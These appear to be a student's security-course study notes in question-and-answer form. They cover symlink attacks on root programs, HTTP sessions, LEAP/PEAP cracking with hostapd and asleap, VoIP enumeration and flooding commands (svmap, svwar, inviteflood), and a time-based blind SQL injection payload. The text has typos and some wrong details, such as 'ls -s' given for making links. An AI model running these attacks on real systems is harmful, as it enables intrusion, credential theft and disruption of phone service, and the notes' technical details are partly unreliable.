Symlinks are pointer from one file to another. They are completely transparent to application and user. -> Creating symlinks does not requirepermission. (bu we must have permission to write in the directory) -> (ls -s PATH_FILE ./LINK_TO_FILE) -> ATTACK Feed a program with some file and take advantage from bad code EX logParser feed /etc?shadow and the progmar print out the line not recognized (ALL) if the program is executed with root privileges -> We could set some file system mount options to avoid that. We can use option when we open a file prom a process es (O_EXCL|O_CREAT) when using open syscall (fails if files alredy exist).

## What does it mean that the HTTP protocol is stateless? What limitations come from this fact? What are HTTP sessions and what are the major techniques to implement sessions? Describe in detail the functioning of at least one of these techniques.
HTTP is stateless protocol because each request is executed indipandently, whitout a knowlege of the request that have been requested before. So once the request is completed the connection between the server and the client is closed. The limitation is that we cannot mantain session, required from some dynamic web application, to avoid log-in for every requested page, keep track for past session, store the user preference and more. So the main solution is that is the web applications that implements the session using COOKIE, SESSIONID, TOKEN and more. For example we can associate a single user to a unique id (uuid) and keep track session from the web application using that uuid. So every time the user request a page he send his uuid and the web application recognizes him and allows him to continue his session.

Stateless because each request is executed indipandently, without a knowledge of what is happened before. -> Connection closed at end of request ->Limitation we cannot mantain a session (what appened before) -> to avoid log-in for every requested page, keep track for past session, store the user preference and more -> Major techniques COOKIE, SESSIONID, TOKEN. -> For example we can associate a single user to a unique id (uuid) and keep track session from the web application using that uuid. So every time the user request a page he send his uuid and the web application recognizes him and allows him to continue his session. (session made by server).

## Describe at least one method to attack WPA Enterprise. What are the possible countermeasures?
WPA enterprise use a RADIUS server to authenticate the users that wont connect to the network. Leap is a proprietary protocol from Cisco Systems developed in 2000 to address the security weakness common in WEP. Is an 102.1x schema using a RADIUS server.
Is fundamentally weak because it provides ZERO RESISTANCE to offline  dictionary attack. It solely rely on MS-CHAPv2 to protect the user credential used for wireless LAN authentications. But MS-CHAPv2 is notoriously weak because it does not use salt in NT hashes he use a weak 2 byte DES key and sends usernames in clear text. Because of this offline dictionary and bruteforce attack can be much efficient. One countermeasure to this is to not use leap. whit EAP-TTLS and PEAP we can attempt an MITM attack. If we can do it a TLS tunnel between an unauthenticated client and a RADIUS server is now useless because we can now decrypt the traffic from the client and the RASIUS server. Often the inner authentication protocol is less secure (often in clear text) and we can try to crack the inner layer protocol. The tool for doing this are hostapd for turn our NIC into an AP and after we capture the traffic from the client to the server we can use asleep for make offline bruteforce in inner authentication protocol. The only countermeasure for this is validate the server certificate.

IF uses LEAP -> vulnerable to offline attack -> hash not salted (MS-CHAPv2 weak 2byte des username in clear text) -> dictionary bruteforce attack -> then crack inner layer protocol (usually weak)-> tool hostapd(turn nic in AP) asleep(offline crack) -> Countermeasure validate certificate AP

## VOIP Attacks. Describe VOIP Enumeration, Denial of Service and other attacks vs VOIP. Which tools are used? Write console commands. Which countermeasures?
**VoIP Enumeration** provide detail and owerview of the setup: VoIP gateway/server, IP-PBK system, client software(softphone)/VoIP phone and user extension [command to do this: svmap.py <IP-RANGE-TO-SCAN>(search phone/PBX) and svwar.py -e<RANGE-EXTENSION> <IP-TO_SCAN> -m INVITE (search extension)]. 

**With DOS** we can attack a sigle phone or multiple phone. To perform this attack we just must send a large colume of fake call (SIP INVITE) to the victim or flooding the phone with unwanted traffic (COMMAND: inviteflood <INTERFACE> <USER(EXTENSION)> <TARGET-DOMAIN> <IP-TARGET> <NUM_OP_PACKET>, and the phone continusly ring now).

**Interceprion attacks**: sniff VoIP datastream with wireshark or make an arpSpoofing attack with dsniff to capture the RTP stream. Than we must recognize the codec of the datasream and than convert datastream to popular file types (TOOLS: scapy or vomit) 

**COUNTERMEASURE** for this attacks are to segmenting the network between voice and  data VLANs, authentication and enryption for all SIP communication, deploy IPS or IDS 

## Can linux security tools be ported to Android? Which tools? Write console commands

Yes this can be done because android is based on linux but you must have access to root privilege to get access to kernel and the phone must have hardware compatible with the software. Rooting you ohone can be done in multiple ways but you need ADB and android SDK. There was some tool to automate this for example Z4root ROOTx Super One Clock, GingerBreak. There are even some distro of kali (Kali Nessus) optimized pr android devices.

## What is a Blind SQLi? Make a concrete example.
Blind SQL is when se can inject some query in a database, but we cannot see the result. The solution is to manipulate the time that the database elaborate the result. For example if our query is true sleep for 5 second, so we can see if our query is true of not and than enumarate the entry with commands SUBTRING, if and SLEEP or BENCKMARK. EX query injected SELECT(IF((SELECT SUBSTR(col, 1, 1) FROM test WHERE id = 1)='a', SLEEP(5), 0);
and so we can check all the value for the single letter in the substring and than we can reconstruct the string.
